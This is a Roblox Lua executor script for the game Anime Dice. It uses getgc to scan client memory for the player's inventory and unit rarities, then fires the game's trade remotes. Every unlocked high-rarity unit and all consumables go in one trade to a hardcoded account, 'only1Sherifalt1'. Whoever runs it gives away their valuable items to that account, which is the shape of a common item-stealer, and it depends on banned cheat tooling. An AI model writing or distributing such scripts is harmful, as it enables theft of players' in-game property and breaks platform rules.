-- Anime Dice Auto-Trade v3
-- Finds your inventory + unit rarities from memory, sends everything in ONE trade.

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local TARGET_NAME = "only1Sherifalt1"
local ADD_DELAY = 0.6
local SKIP_LOCKED = true

-- units with these rarities get sent (check the summary print and edit if needed)
local RARITIES = { "Celestial", "Secret I", "Secret II", "Mythic" }
local CONSUMABLES = { "Trait Reroll", "Gems", "Lucky Spin", "Luck IV", "Luck III", "Luck II", "Luck I" }

local accept = {}
for _, r in ipairs(RARITIES) do accept[r] = true end

print("[START] Waiting 3s...")
task.wait(3)

local target = Players:FindFirstChild(TARGET_NAME)
if not target then
	warn("[ERROR] Target not in server: " .. TARGET_NAME)
	return
end

if not getgc then
	warn("[ERROR] getgc not supported by this executor")
	return
end

-- Remotes
local network = RS:FindFirstChild("Network")
local svc = network and network:FindFirstChild("TradeService")
local RE = svc and svc:FindFirstChild("RE")
local RequestTrade = RE and RE:FindFirstChild("RequestTrade")
local ChangeOffer = RE and RE:FindFirstChild("ChangeOffer")
local AdvanceTrade = RE and RE:FindFirstChild("AdvanceTrade")
if not (RequestTrade and ChangeOffer and AdvanceTrade) then
	warn("[ERROR] Trade remotes not found")
	return
end

-- Rarity helper: entry may hold rarity directly or inside entryConfig
local function rarityOf(cfg)
	if type(cfg) ~= "table" then return nil end
	local r = rawget(cfg, "rarity")
	if r == nil then
		local ec = rawget(cfg, "entryConfig")
		if type(ec) == "table" then r = rawget(ec, "rarity") end
	end
	return r ~= nil and tostring(r) or nil
end

-- One pass over memory: find raw inventory + unit config tables
local inventory
local rarityByName = {}

for _, t in ipairs(getgc(true)) do
	pcall(function()
		if type(t) ~= "table" then return end

		if not inventory then
			local lt = rawget(t, "Luck III")
			if type(lt) == "table"
				and rawget(lt, "name") == "Luck III"
				and type(rawget(lt, "amount")) == "number" then
				inventory = t
			end
		end

		if rawget(t, "stackable") == false then
			local entries = rawget(t, "entries")
			if type(entries) == "table" then
				for name, cfg in pairs(entries) do
					local r = rarityOf(cfg)
					if r then rarityByName[name] = r end
				end
			end
		end
	end)
end

if not inventory then
	warn("[ERROR] Inventory table not found. Open your inventory menu once, then re-run.")
	return
end
print("[FOUND] Inventory located")

local nRar = 0
for _ in pairs(rarityByName) do nRar += 1 end
if nRar == 0 then
	warn("[ERROR] No unit rarity data found. Open your units menu once, then re-run.")
	return
end
print("[FOUND] Rarity data for " .. nRar .. " units")

-- Collect trade list
local toTrade = {}
local seen = {}

for key, item in pairs(inventory) do
	if type(key) == "string" and key:match("^%x+%-%x+%-%x+%-%x+%-%x+$") and type(item) == "table" then
		local name = rawget(item, "name")
		local attrs = rawget(item, "attributes")
		local locked = type(attrs) == "table" and rawget(attrs, "locked") == true
		local rarity = name and rarityByName[name]
		if rarity then seen[rarity] = (seen[rarity] or 0) + 1 end
		if rarity and accept[rarity] and not (SKIP_LOCKED and locked) then
			table.insert(toTrade, { key, 1, name .. " (" .. rarity .. ")" })
		end
	end
end

print("[SUMMARY] Units you own by rarity:")
for r, n in pairs(seen) do
	print("   " .. r .. ": " .. n .. (accept[r] and "  <- sending" or ""))
end

for _, cname in ipairs(CONSUMABLES) do
	local item = inventory[cname]
	if type(item) == "table" and type(rawget(item, "amount")) == "number" and item.amount > 0 then
		table.insert(toTrade, { cname, item.amount, cname })
	end
end

if #toTrade == 0 then
	warn("[ERROR] Nothing to trade")
	return
end

-- Trade
print("[TRADE] Requesting trade (" .. #toTrade .. " items)...")
RequestTrade:FireServer(target)
task.wait(3)

for _, it in ipairs(toTrade) do
	local ok, err = pcall(function()
		ChangeOffer:FireServer(it[1], it[2])
	end)
	print(ok and ("[ADDED] " .. it[3] .. " x" .. it[2]) or ("[FAIL] " .. it[3] .. ": " .. tostring(err)))
	task.wait(ADD_DELAY)
end

task.wait(1)
AdvanceTrade:FireServer()
print("[DONE] Trade advanced")
